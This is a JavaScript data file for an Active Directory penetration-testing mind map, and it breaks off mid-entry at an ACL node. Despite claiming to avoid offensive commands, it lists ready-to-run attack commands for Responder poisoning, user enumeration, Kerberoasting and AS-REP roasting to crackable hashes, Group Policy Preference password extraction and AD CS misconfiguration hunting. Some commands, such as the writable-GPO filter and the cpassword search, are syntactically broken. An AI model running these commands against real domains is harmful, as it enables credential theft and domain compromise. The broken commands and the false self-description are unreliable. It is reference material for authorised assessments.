window.MINDMAP_AD_DATA = {
    root: {
        id: 'ad-root',
        data: {
            label: 'Active Directory',
            description: 'Enterprise Security Assessment Flow',
            descriptionMd: '## Active Directory\nDomain assessments revolve around **identity**, **Kerberos/NTLM**, **trust paths**, and **misconfigurations**. This map keeps technique names for orientation, but avoids step-by-step offensive commands.\n',
            commands: [],
            type: 'root',
            emoji: '🏰',
            resources: [{
                    title: 'MITRE ATT&CK - Enterprise',
                    url: 'https://attack.mitre.org/versions/v13/'
                },
                {
                    title: 'Microsoft Security - Active Directory Overview',
                    url: 'https://learn.microsoft.com/en-us/windows-server/identity/active-directory-domain-services'
                }
            ]
        },
        children: [{
                id: 'ad-pre',
                data: {
                    label: 'Pre-Engagement',
                    description: 'ROE, Scope, Safety, Accounts',
                    descriptionMd: '### Pre-Engagement\nAlign on scope, test windows, data handling, and incident escalation. Ensure you have approved test accounts and clear stop conditions.\n',
                    commands: [],
                    type: 'category',
                    emoji: '🧾',
                    resources: [{
                        title: 'PTES Pre-Engagement',
                        url: 'https://www.pentest-standard.org/index.php/Pre-engagement'
                    }]
                },
                children: [{
                        id: 'ad-roe',
                        data: {
                            label: 'ROE & Constraints',
                            description: 'Boundaries & guardrails',
                            descriptionMd: '### ROE & Constraints\nSpecify what is allowed (auth testing, relay simulations, password policy checks), what is excluded (production disruption, high-volume auth), and evidence handling.\n',
                            commands: [],
                            type: 'technique',
                            emoji: '📜',
                            resources: []
                        },
                        children: []
                    },
                    {
                        id: 'ad-test-accounts',
                        data: {
                            label: 'Test Accounts',
                            description: 'Least-privileged seeds',
                            descriptionMd: '### Test Accounts\nPrefer named test identities with known roles to validate privilege boundaries and lateral movement paths without “guessing” behavior.\n',
                            commands: [],
                            type: 'technique',
                            emoji: '🪪',
                            resources: []
                        },
                        children: []
                    }
                ]
            },

            {
                id: 'ad-recon',
                data: {
                    label: 'Recon',
                    description: 'Domain Discovery & Intelligence Gathering',
                    descriptionMd: '### Recon\nComprehensive enumeration of Active Directory infrastructure, trust relationships, and attack surface. Map the environment systematically before attempting exploitation.\n\n**Key Objectives:**\n* Identify Domain Controllers and critical infrastructure\n* Map trust relationships and forest topology\n* Enumerate users, groups, computers, and permissions\n* Discover service accounts and SPNs\n* Identify PKI infrastructure and certificate templates\n* Analyze GPOs and delegation patterns\n* Build privilege escalation graphs',
                    commands: [],
                    type: 'category',
                    emoji: '🔎',
                    resources: [{
                            title: 'Microsoft - Active Directory Replication and Topology',
                            url: 'https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-replication'
                        },
                        {
                            title: 'AD Exploitation Cheat Sheet',
                            url: 'https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet'
                        },
                        {
                            title: 'Attacking Active Directory - Zero to Hero',
                            url: 'https://zer1t0.gitlab.io/posts/attacking_ad/'
                        }
                    ]
                },
                children: [{
                        id: 'ad-network-discovery',
                        data: {
                            label: 'Network Discovery',
                            description: 'DCs, critical servers, management planes',
                            descriptionMd: '### Network Discovery\nBuild a comprehensive asset inventory of Active Directory infrastructure. Identify Domain Controllers, Global Catalogs, PKI/AD CS servers, file servers, management jump boxes, SCCM/MDM systems, and identity-integrated applications.\n\n**Critical AD Ports:**\n* **88/TCP+UDP:** Kerberos authentication\n* **389/TCP+UDP:** LDAP\n* **636/TCP:** LDAPS (LDAP over SSL)\n* **3268/TCP:** Global Catalog\n* **3269/TCP:** Global Catalog over SSL\n* **445/TCP:** SMB/CIFS\n* **135/TCP:** RPC Endpoint Mapper\n* **139/TCP:** NetBIOS Session\n* **464/TCP+UDP:** Kerberos password change\n* **5985/TCP:** WinRM HTTP\n* **5986/TCP:** WinRM HTTPS\n\n**What to Identify:**\n* Domain Controllers and their roles (PDC Emulator, RID Master, etc.)\n* Certificate Authority servers\n* ADFS/federation servers\n* Exchange servers\n* SQL servers with AD integration\n* Management workstations and jump boxes\n* Network segmentation and VLANs',
                            commands: [{
                                    description: 'Quick DC Discovery',
                                    code: 'nmap -p 88,389,636,3268,3269 -sV --script ldap-rootdse 10.0.0.0/24'
                                },
                                {
                                    description: 'Full AD Port Scan',
                                    code: 'nmap -p 88,135,139,445,464,593,3268,3269,5985,5986 -sV -Pn -T4 10.0.0.0/24'
                                },
                                {
                                    description: 'ARP Network Discovery',
                                    code: 'arp-scan -l'
                                },
                                {
                                    description: 'Netdiscover',
                                    code: 'netdiscover -r 10.0.0.0/24 -P'
                                },
                                {
                                    description: 'Responder Passive Mode',
                                    code: 'responder -I eth0 -A'
                                },
                                {
                                    description: 'CrackMapExec Host Discovery',
                                    code: 'crackmapexec smb 10.0.0.0/24'
                                },
                                {
                                    description: 'Nmap DC Script Scan',
                                    code: 'nmap --script smb-os-discovery,ldap-rootdse -p445,389 <target>'
                                }
                            ],
                            type: 'technique',
                            emoji: '🗺️',
                            resources: [{
                                    title: 'AD Network Architecture',
                                    url: 'https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/understanding-active-directory-site-topology'
                                },
                                {
                                    title: 'AD Port Requirements',
                                    url: 'https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/config-firewall-for-ad-domains-and-trusts'
                                }
                            ]
                        },
                        children: []
                    },
                    {
                        id: 'ad-dns-recon',
                        data: {
                            label: 'DNS Recon',
                            description: 'SRV records, zones & site topology',
                            descriptionMd: '### DNS Recon\nLeverage DNS to discover domain structure, Domain Controllers, Global Catalogs, and service locations. SRV records reveal authentication infrastructure and site topology. Zone transfers may expose internal naming conventions and subdomains.\n\n**Critical SRV Records:**\n* **_ldap._tcp.dc._msdcs.DOMAIN:** All domain controllers\n* **_kerberos._tcp.dc._msdcs.DOMAIN:** Kerberos KDCs\n* **_gc._tcp.DOMAIN:** Global Catalog servers\n* **_kerberos._tcp.DOMAIN:** Kerberos authentication\n* **_ldap._tcp.SITENAME._sites.dc._msdcs.DOMAIN:** Site-specific DCs\n* **_kpasswd._tcp.DOMAIN:** Kerberos password change\n\n**What DNS Reveals:**\n* Domain Controller locations and roles\n* AD site structure and replication topology\n* Forest and domain FQDN structure\n* Service endpoints (ADFS, Exchange, etc.)\n* Internal naming conventions\n* Potential subdomain takeover targets',
                            commands: [{
                                    description: 'Enumerate LDAP SRV Records',
                                    code: 'nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local'
                                },
                                {
                                    description: 'Enumerate Kerberos SRV Records',
                                    code: 'nslookup -type=SRV _kerberos._tcp.dc._msdcs.domain.local'
                                },
                                {
                                    description: 'Find Global Catalogs',
                                    code: 'nslookup -type=SRV _gc._tcp.domain.local'
                                },
                                {
                                    description: 'Attempt Zone Transfer',
                                    code: 'dig @10.0.0.1 domain.local axfr'
                                },
                                {
                                    description: 'DNSEnum Full Scan',
                                    code: 'dnsenum --enum domain.local -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt'
                                },
                                {
                                    description: 'ADIDNSDump',
                                    code: 'adidnsdump -u domain\\user -p password 10.0.0.1'
                                },
                                {
                                    description: 'PowerShell DNS Records',
                                    code: 'Get-DnsServerZone | Get-DnsServerResourceRecord'
                                },
                                {
                                    description: 'Resolve All DCs',
                                    code: 'nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local | grep "svr hostname"'
                                }
                            ],
                            type: 'technique',
                            emoji: '🧷',
                            resources: [{
                                    title: 'DNS SRV Records in AD',
                                    url: 'https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/verify-srv-dns-records-have-been-created'
                                },
                                {
                                    title: 'adidnsdump Tool',
                                    url: 'https://github.com/dirkjanm/adidnsdump'
                                }
                            ]
                        },
                        children: []
                    },
                    {
                        id: 'ad-anonymous-enum',
                        data: {
                            label: 'Anonymous/Guest Enum',
                            description: 'Pre-auth information gathering',
                            descriptionMd: '### Anonymous/Guest Enumeration\nAttempt unauthenticated enumeration via null sessions, guest access, or anonymous LDAP binds. Misconfigurations often reveal domain naming, user lists, group memberships, and policy information without credentials.\n\n**Common Anonymous Access:**\n* **Null SMB Sessions:** Legacy Windows allows anonymous RPC/SMB queries\n* **Guest Account:** Often enabled by default in older domains\n* **Anonymous LDAP Bind:** Some DCs allow unauthenticated LDAP queries\n* **Kerberos Pre-auth:** Username enumeration via AS-REQ responses\n\n**What You Can Enumerate:**\n* Domain name and SID\n* User account names\n* Group memberships\n* Password policies\n* Share listings\n* Domain trust relationships\n* OS versions and patch levels',
                            commands: [{
                                    description: 'enum4linux Full Scan',
                                    code: 'enum4linux -a 10.0.0.1'
                                },
                                {
                                    description: 'enum4linux-ng Enhanced',
                                    code: 'enum4linux-ng -A 10.0.0.1'
                                },
                                {
                                    description: 'RPC Null Session',
                                    code: 'rpcclient -U "" -N 10.0.0.1'
                                },
                                {
                                    description: 'RPC Enumerate Users',
                                    code: 'rpcclient -U "" -N 10.0.0.1 -c enumdomusers'
                                },
                                {
                                    description: 'RPC Domain Info',
                                    code: 'rpcclient -U "" -N 10.0.0.1 -c querydominfo'
                                },
                                {
                                    description: 'CME Anonymous Enum',
                                    code: 'crackmapexec smb 10.0.0.1 --users --shares'
                                },
                                {
                                    description: 'Anonymous LDAP Search',
                                    code: 'ldapsearch -x -h 10.0.0.1 -s base namingcontexts'
                                },
                                {
                                    description: 'Kerbrute User Enum',
                                    code: 'kerbrute userenum --dc 10.0.0.1 -d domain.local users.txt'
                                },
                                {
                                    description: 'Nmap SMB Scripts',
                                    code: 'nmap --script smb-enum-users,smb-enum-groups,smb-enum-shares -p445 10.0.0.1'
                                }
                            ],
                            type: 'technique',
                            emoji: '👤',
                            resources: [{
                                    title: 'enum4linux-ng',
                                    url: 'https://github.com/cddmp/enum4linux-ng'
                                },
                                {
                                    title: 'Kerbrute',
                                    url: 'https://github.com/ropnop/kerbrute'
                                },
                                {
                                    title: 'Null Session Attacks',
                                    url: 'https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb'
                                }
                            ]
                        },
                        children: []
                    },
                    {
                        id: 'smb-enum',
                        data: {
                            label: 'SMB Enum',
                            description: 'Shares, signing, session enumeration',
                            descriptionMd: '### SMB Enumeration\nIdentify accessible shares, SMB signing configuration, NetBIOS names, and active sessions. Map data repositories, home directories, and SYSVOL/NETLOGON for Group Policy extraction. Verify whether SMB signing is enforced to determine relay attack viability.\n\n**SMB Shares of Interest:**\n* **SYSVOL:** Group Policy Objects, scripts, software deployment\n* **NETLOGON:** Login scripts, often writable in misconfigurations\n* **C$, ADMIN$, IPC$:** Administrative shares (require privileges)\n* **Home directories:** User files and credentials\n* **Department shares:** Potentially sensitive business data\n\n**Security Checks:**\n* **SMB Signing:** If not required, SMB relay attacks possible\n* **Guest Access:** Anonymous share access\n* **Null Sessions:** Unauthenticated enumeration\n* **Writable Shares:** Potential for payload staging\n* **Password in Files:** credentials.txt, passwords.xlsx, etc.',
                            commands: [{
                                    description: 'CME Share Enumeration',
                                    code: 'crackmapexec smb 10.0.0.1 -u user -p password --shares'
                                },
                                {
                                    description: 'smbmap Permission Check',
                                    code: 'smbmap -H 10.0.0.1 -u user -p password -r'
                                },
                                {
                                    description: 'List Shares',
                                    code: 'smbclient -L //10.0.0.1 -U user'
                                },
                                {
                                    description: 'Connect to Share',
                                    code: 'smbclient //10.0.0.1/sharename -U user'
                                },
                                {
                                    description: 'Check SMB Signing',
                                    code: 'crackmapexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt'
                                },
                                {
                                    description: 'Nmap SMB Scripts',
                                    code: 'nmap --script smb-enum-shares,smb-enum-users,smb-protocols,smb-security-mode -p445 10.0.0.1'
                                },
                                {
                                    description: 'Recursive Share Download',
                                    code: 'smbget -R smb://10.0.0.1/share -U user'
                                },
                                {
                                    description: 'PowerShell Shares',
                                    code: 'Get-SmbShare'
                                },
                                {
                                    description: 'Mount SMB Share (Linux)',
                                    code: 'mount -t cifs //10.0.0.1/share /mnt/share -o user=domain\\user'
                                }
                            ],
                            type: 'tool',
                            emoji: '🖥️',
                            resources: [{
                                    title: 'CrackMapExec Wiki',
                                    url: 'https://www.crackmapexec.wiki/'
                                },
                                {
                                    title: 'SMB Security Best Practices',
                                    url: 'https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-security'
                                },
                                {
                                    title: 'SMB Enumeration Guide',
                                    url: 'https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb'
                                }
                            ]
                        },
                        children: []
                    },
                    {
                        id: 'ldap-enum',
                        data: {
                            label: 'LDAP Enum',
                            description: 'Users, groups, computers, OUs, GPOs, ACLs',
                            descriptionMd: '### LDAP Enumeration\nQuery Active Directory via LDAP/LDAPS to extract comprehensive directory information. Build a complete model of users, groups, computers, Organizational Units, GPO links, delegation configurations, and ACL permissions for privilege analysis.\n\n**Key LDAP Attributes:**\n* **Users:** sAMAccountName, userPrincipalName, memberOf, adminCount, userAccountControl\n* **Groups:** member, groupType, managedBy, description\n* **Computers:** dNSHostName, operatingSystem, lastLogonTimestamp, servicePrincipalName\n* **GPOs:** gPLink, gPOptions, displayName\n* **Delegation:** msDS-AllowedToDelegateTo, userAccountControl (TRUSTED_FOR_DELEGATION)\n\n**High-Value Targets:**\n* **adminCount=1:** Protected privileged accounts\n* **DONT_REQ_PREAUTH:** AS-REP roastable accounts\n* **servicePrincipalName:** Kerberoastable service accounts\n* **Unconstrained Delegation:** Domain compromise vector\n* **PASSWD_NOTREQD:** Accounts with empty passwords\n* **DONT_EXPIRE_PASSWORD:** Service accounts with static passwords',
                            commands: [{
                                    description: 'ldapsearch All Users',
                                    code: 'ldapsearch -x -h 10.0.0.1 -D "user@domain.local" -w password -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName userPrincipalName'
                                },
                                {
                                    description: 'Find Admin Users',
                                    code: 'ldapsearch -x -h 10.0.0.1 -D "user@domain.local" -w password -b "DC=domain,DC=local" "(adminCount=1)" sAMAccountName'
                                },
                                {
                                    description: 'AS-REP Roastable Users',
                                    code: 'ldapsearch -x -h 10.0.0.1 -D "user@domain.local" -w password -b "DC=domain,DC=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"'
                                },
                                {
                                    description: 'Kerberoastable Accounts',
                                    code: 'ldapsearch -x -h 10.0.0.1 -D "user@domain.local" -w password -b "DC=domain,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" servicePrincipalName'
                                },
                                {
                                    description: 'Windapsearch Users',
                                    code: 'python3 windapsearch.py -d domain.local -u user -p password --dc-ip 10.0.0.1 -U'
                                },
                                {
                                    description: 'Windapsearch Groups',
                                    code: 'python3 windapsearch.py -d domain.local -u user -p password --dc-ip 10.0.0.1 -G'
                                },
                                {
                                    description: 'Windapsearch Privileged',
                                    code: 'python3 windapsearch.py -d domain.local -u user -p password --dc-ip 10.0.0.1 --privileged-users'
                                },
                                {
                                    description: 'ldapdomaindump',
                                    code: 'ldapdomaindump -u "domain\\user" -p password 10.0.0.1'
                                },
                                {
                                    description: 'PowerView Users',
                                    code: 'Get-DomainUser | Select-Object samaccountname,description,admincount'
                                },
                                {
                                    description: 'PowerView Computers',
                                    code: 'Get-DomainComputer | Select-Object dnshostname,operatingsystem'
                                },
                                {
                                    description: 'PowerView Groups',
                                    code: 'Get-DomainGroup | Select-Object samaccountname,member'
                                }
                            ],
                            type: 'tool',
                            emoji: '📋',
                            resources: [{
                                    title: 'windapsearch',
                                    url: 'https://github.com/ropnop/windapsearch'
                                },
                                {
                                    title: 'ldapdomaindump',
                                    url: 'https://github.com/dirkjanm/ldapdomaindump'
                                },
                                {
                                    title: 'LDAP Query Examples',
                                    url: 'https://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx'
                                },
                                {
                                    title: 'PowerView Cheat Sheet',
                                    url: 'https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993'
                                }
                            ]
                        },
                        children: []
                    },
                    {
                        id: 'ad-kerberos-recon',
                        data: {
                            label: 'Kerberos Recon',
                            description: 'Realm posture, SPNs & auth surface',
                            descriptionMd: '### Kerberos Recon\nMap Kerberos usage patterns, identify service accounts with SPNs, and discover weak configuration patterns. Understanding Kerberos deployment helps identify Kerberoasting targets, delegation issues, and authentication bypass opportunities.\n\n**Key Kerberos Concepts:**\n* **SPN (Service Principal Name):** Identifies services for Kerberos auth\n* **TGT (Ticket Granting Ticket):** Initial authentication ticket\n* **TGS (Ticket Granting Service):** Service-specific access ticket\n* **AS-REP:** Authentication Service Response (roastable if pre-auth disabled)\n* **RC4 vs AES:** Encryption downgrade attacks possible\n\n**Attack Vectors:**\n* **Kerberoasting:** Extract TGS tickets for offline cracking\n* **AS-REP Roasting:** Target accounts without pre-auth\n* **Unconstrained Delegation:** Impersonate any user\n* **Constrained Delegation:** Limited impersonation\n* **Bronze Bit (CVE-2020-17049):** S4U2self service ticket forgery\n* **Silver Ticket:** Forge TGS with compromised service account\n* **Golden Ticket:** Forge TGT with krbtgt hash',
                            commands: [{
                                    description: 'Enumerate SPNs',
                                    code: 'GetUserSPNs.py -request -dc-ip 10.0.0.1 domain.local/user:password'
                                },
                                {
                                    description: 'AS-REP Roast',
                                    code: 'GetNPUsers.py domain.local/ -dc-ip 10.0.0.1 -usersfile users.txt -format hashcat'
                                },
                                {
                                    description: 'Rubeus Kerberoast',
                                    code: 'Rubeus.exe kerberoast /outfile:hashes.txt'
                                },
                                {
                                    description: 'Rubeus AS-REP Roast',
                                    code: 'Rubeus.exe asreproast /outfile:asrep_hashes.txt'
                                },
                                {
                                    description: 'PowerView SPNs',
                                    code: 'Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname'
                                },
                                {
                                    description: 'PowerView AS-REP',
                                    code: 'Get-DomainUser -PreauthNotRequired | Select-Object samaccountname'
                                },
                                {
                                    description: 'Find Delegation',
                                    code: 'Get-DomainComputer -Unconstrained | Select-Object dnshostname'
                                },
                                {
                                    description: 'Constrained Delegation',
                                    code: 'Get-DomainUser -TrustedToAuth | Select-Object samaccountname,msds-allowedtodelegateto'
                                },
                                {
                                    description: 'Kerberos Policy',
                                    code: 'Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy'
                                }
                            ],
                            type: 'technique',
                            emoji: '🎟️',
                            resources: [{
                                    title: 'Impacket Examples',
                                    url: 'https://github.com/fortra/impacket/tree/master/examples'
                                },
                                {
                                    title: 'Kerberos Attack Explained',
                                    url: 'https://adsecurity.org/?p=2011'
                                },
                                {
                                    title: 'Kerberoasting Guide',
                                    url: 'https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast'
                                },
                                {
                                    title: 'Rubeus Documentation',
                                    url: 'https://github.com/GhostPack/Rubeus'
                                }
                            ]
                        },
                        children: []
                    },
                    {
                        id: 'ad-bh-paths',
                        data: {
                            label: 'Privilege Graph',
                            description: 'Trust paths & effective rights',
                            descriptionMd: '### Privilege Graph Analysis\nRepresent Active Directory permissions as a graph to visualize attack paths. Map sessions, local admin rights, group memberships, and ACL edges to identify the shortest realistic privilege escalation path to Domain Admin or other high-value targets.\n\n**BloodHound Edges:**\n* **MemberOf:** Group membership inheritance\n* **AdminTo:** Local admin rights on computers\n* **HasSession:** Logged-in user sessions\n* **Owns:** Object ownership (modify permissions)\n* **GenericAll:** Full control over object\n* **WriteDacl:** Modify object ACLs\n* **WriteOwner:** Change object owner\n* **ForceChangePassword:** Reset user password\n* **AddMembers:** Add users to groups\n\n**Analysis Goals:**\n* Find shortest path to Domain Admins\n* Identify Kerberoastable users in privileged paths\n* Locate computers with high-value sessions\n* Discover ACL-based escalation opportunities\n* Map Tier-0 boundaries and violations',
                            commands: [{
                                    description: 'SharpHound Collection',
                                    code: 'SharpHound.exe -c All --zipfilename output.zip'
                                },
                                {
                                    description: 'SharpHound Stealth',
                                    code: 'SharpHound.exe -c DCOnly,Session --throttle 1000'
                                },
                                {
                                    description: 'BloodHound.py',
                                    code: 'bloodhound-python -d domain.local -u user -p password -dc dc01.domain.local -c all'
                                },
                                {
                                    description: 'BloodHound.py DNS',
                                    code: 'bloodhound-python -d domain.local -u user -p password -ns 10.0.0.1 -c all'
                                },
                                {
                                    description: 'Find Paths to DA',
                                    code: 'MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p'
                                },
                                {
                                    description: 'Find Kerberoastable Paths',
                                    code: 'MATCH p=shortestPath((u:User {hasspn:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p'
                                },
                                {
                                    description: 'Find Admin Sessions',
                                    code: 'MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) RETURN c.name,u.name'
                                },
                                {
                                    description: 'Owned Principals',
                                    code: 'MATCH (n) WHERE n.owned=true RETURN n'
                                }
                            ],
                            type: 'technique',
                            emoji: '🕸️',
                            resources: [{
                                    title: 'BloodHound Docs',
                                    url: 'https://bloodhound.readthedocs.io/en/latest/'
                                },
                                {
                                    title: 'BloodHound GitHub',
                                    url: 'https://github.com/BloodHoundAD/BloodHound'
                                },
                                {
                                    title: 'Cypher Query Examples',
                                    url: 'https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/'
                                },
                                {
                                    title: 'BloodHound.py',
                                    url: 'https://github.com/dirkjanm/BloodHound.py'
                                }
                            ]
                        },
                        children: []
                    },
                    {
                        id: 'ad-trusts',
                        data: {
                            label: 'Trusts & Forest Topology',
                            description: 'Cross-domain/forest exposure',
                            descriptionMd: '### Trust & Forest Analysis\nIdentify external trusts, cross-forest relationships, and trust authentication boundaries. Map bidirectional trusts, selective authentication, SID filtering, and "admin tier" boundaries that can collapse through trust exploitation.\n\n**Trust Types:**\n* **Parent-Child:** Automatic two-way transitive (within forest)\n* **Tree-Root:** Two-way transitive between forest trees\n* **External:** Non-transitive trust between domains\n* **Forest:** Transitive trust between forests\n* **Realm:** Trust with Kerberos realm (Unix/Linux)\n\n**Trust Properties:**\n* **Transitive:** Trust extends through trust chains\n* **Non-Transitive:** Trust limited to two domains\n* **Bidirectional:** Authentication flows both ways\n* **Unidirectional:** One-way authentication\n* **SID Filtering:** Blocks SIDHistory attacks (should be enabled)\n* **Selective Authentication:** Requires explicit permissions\n\n**Attack Vectors:**\n* **SID History Injection:** Escalate across trusts\n* **Foreign Security Principals:** Cross-domain group members\n* **Trust Account Compromise:** RC4 HMAC keys for trust\n* **Child to Parent Escalation:** ExtraSids Golden Ticket',
                            commands: [{
                                    description: 'PowerView Domain Trusts',
                                    code: 'Get-DomainTrust'
                                },
                                {
                                    description: 'PowerView Forest Trusts',
                                    code: 'Get-ForestTrust'
                                },
                                {
                                    description: 'nltest Trusts',
                                    code: 'nltest /domain_trusts'
                                },
                                {
                                    description: 'nltest All Trusts',
                                    code: 'nltest /domain_trusts /all_trusts'
                                },
                                {
                                    description: 'PowerShell AD Trusts',
                                    code: 'Get-ADTrust -Filter *'
                                },
                                {
                                    description: 'Foreign Security Principals',
                                    code: 'Get-DomainForeignGroupMember'
                                },
                                {
                                    description: 'Trust Account Info',
                                    code: 'Get-DomainTrust | Select-Object SourceName,TargetName,TrustDirection,TrustType'
                                },
                                {
                                    description: 'Map Forest Domains',
                                    code: 'Get-ForestDomain'
                                },
                                {
                                    description: 'Check SID Filtering',
                                    code: 'netdom trust trustingdomain /domain:trusteddomain /quarantine'
                                }
                            ],
                            type: 'technique',
                            emoji: '🌲',
                            resources: [{
                                    title: 'Trust Relationships Overview',
                                    url: 'https://learn.microsoft.com/en-us/entra/identity/domain-services/concepts-forest-trust'
                                },
                                {
                                    title: 'Trust Attack Techniques',
                                    url: 'https://adsecurity.org/?p=1588'
                                },
                                {
                                    title: 'SID Filtering Explained',
                                    url: 'https://adsecurity.org/?p=1772'
                                }
                            ]
                        },
                        children: []
                    },
                    {
                        id: 'adcs-enum',
                        data: {
                            label: 'AD CS Discovery',
                            description: 'PKI roles, templates, enrollment',
                            descriptionMd: '### AD CS (Certificate Services) Discovery\nDiscover Certificate Authority servers, enrollment endpoints, certificate templates, and enrollment permissions. PKI misconfigurations frequently provide direct paths to domain compromise through certificate-based authentication.\n\n**AD CS Components:**\n* **Enterprise CA:** Issues certificates for domain\n* **Certificate Templates:** Define certificate purpose and permissions\n* **Enrollment Services:** Web and RPC enrollment endpoints\n* **Certificate Trust Lists:** Trusted root CAs\n\n**Dangerous Template Configurations:**\n* **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT:** User specifies Subject Alternative Name\n* **PEND_ALL_REQUESTS disabled:** Auto-approval without admin review\n* **msPKI-Certificate-Name-Flag allows SAN:** Can request cert for any user\n* **Low-privileged enrollment rights:** Domain Users can enroll\n* **Manager approval disabled:** No human verification\n* **Agent certificates:** Enroll on behalf of others\n\n**ESC Attack Patterns:**\n* **ESC1:** Misconfigured template with SAN\n* **ESC2:** Any Purpose EKU or No EKU\n* **ESC3:** Enrollment agent templates\n* **ESC4:** Vulnerable template ACLs\n* **ESC6:** EDITF_ATTRIBUTESUBJECTALTNAME2 flag\n* **ESC8:** NTLM relay to HTTP enrollment\n* **ESC9-11:** Additional privilege escalation vectors',
                            commands: [{
                                    description: 'Certify Find Vulnerable',
                                    code: 'Certify.exe find /vulnerable'
                                },
                                {
                                    description: 'Certify Find All',
                                    code: 'Certify.exe find'
                                },
                                {
                                    description: 'Certipy Find',
                                    code: 'certipy find -u user@domain.local -p password -dc-ip 10.0.0.1'
                                },
                                {
                                    description: 'Certipy Vulnerable',
                                    code: 'certipy find -u user@domain.local -p password -dc-ip 10.0.0.1 -vulnerable'
                                },
                                {
                                    description: 'PowerView CA Servers',
                                    code: 'Get-DomainObject -SearchBase "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local"'
                                },
                                {
                                    description: 'Enumerate Templates',
                                    code: 'certutil -v -template > templates.txt'
                                },
                                {
                                    description: 'Get-CA from PKI module',
                                    code: 'Get-CertificationAuthority'
                                },
                                {
                                    description: 'LDAP Template Query',
                                    code: 'ldapsearch -x -h 10.0.0.1 -D "user@domain.local" -w password -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local"'
                                }
                            ],
                            type: 'technique',
                            emoji: '🪪',
                            resources: [{
                                    title: 'Microsoft - AD CS Overview',
                                    url: 'https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/active-directory-certificate-services-overview'
                                },
                                {
                                    title: 'Certified Pre-Owned (AD CS Attacks)',
                                    url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2'
                                },
                                {
                                    title: 'Certipy Tool',
                                    url: 'https://github.com/ly4k/Certipy'
                                },
                                {
                                    title: 'Certify Tool',
                                    url: 'https://github.com/GhostPack/Certify'
                                }
                            ]
                        },
                        children: []
                    },
                    {
                        id: 'ad-gpo-analysis',
                        data: {
                            label: 'GPO Analysis',
                            description: 'Group Policy enumeration & abuse',
                            descriptionMd: '### Group Policy Object Analysis\nEnumerate and analyze Group Policy Objects for privilege escalation opportunities, credential exposure, and policy weaknesses. GPOs control critical security settings and can be leveraged for lateral movement and persistence.\n\nGPO Attack Vectors:\n* Writable GPO paths: Modify policies for code execution\n* GPO ACL abuse: Edit permissions allow policy modification\n* Passwords in GPOs: Legacy Group Policy Preferences (cpassword)\n* Startup/Logon scripts: Inject malicious code\n* Scheduled tasks: Deploy via GPO\n* Software installation: MSI deployment abuse\n\nHigh-Value GPO Data:\n* Registry modifications (credential locations)\n* Script paths and parameters\n* Software deployment packages\n* Security policy settings\n* OU link structure and enforcement\n* GPO permissions and delegation',
                            commands: [{
                                    description: 'PowerView GPOs',
                                    code: 'Get-DomainGPO | Select-Object displayname,gpcfilesyspath'
                                },
                                {
                                    description: 'Find Writable GPOs',
                                    code: 'Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner"}'
                                },
                                {
                                    description: 'GPO Applied to User',
                                    code: 'Get-DomainGPO -Identity user'
                                },
                                {
                                    description: 'GPO Applied to Computer',
                                    code: 'Get-DomainGPO -ComputerIdentity computer.domain.local'
                                },
                                {
                                    description: 'Find GPP Passwords',
                                    code: 'Get-GPPPassword'
                                },
                                {
                                    description: 'Parse SYSVOL for cpassword',
                                    code: 'findstr /S /I cpassword \\domain.local\sysvol\.xml'
                                },
                                {
                                    description: 'PowerShell Get GPO',
                                    code: 'Get-GPO -All | Select-Object DisplayName,GpoStatus,ModificationTime'
                                },
                                {
                                    description: 'gpresult Local Policy',
                                    code: 'gpresult /r'
                                },
                                {
                                    description: 'gpresult Remote',
                                    code: 'gpresult /s computer /u domain\\user /p password /r'
                                }
                            ],
                            type: 'technique',
                            emoji: '📜',
                            resources: [{
                                    title: 'Group Policy Exploitation',
                                    url: 'https://adsecurity.org/?p=2716'
                                },
                                {
                                    title: 'GPP Password Attack',
                                    url: 'https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse/group-policy-objects'
                                },
                                {
                                    title: 'Microsoft GPO Documentation',
                                    url: 'https://learn.microsoft.com/en-us/previous-versions/windows/desktop/policy/group-policy-objects'
                                }
                            ]
                        },
                        children: []
                    },
                    {
                        id: 'ad-acl-enum',
                        data: {
                            label: 'ACL Analysis',
                            description: 'Discretionary access control auditing',
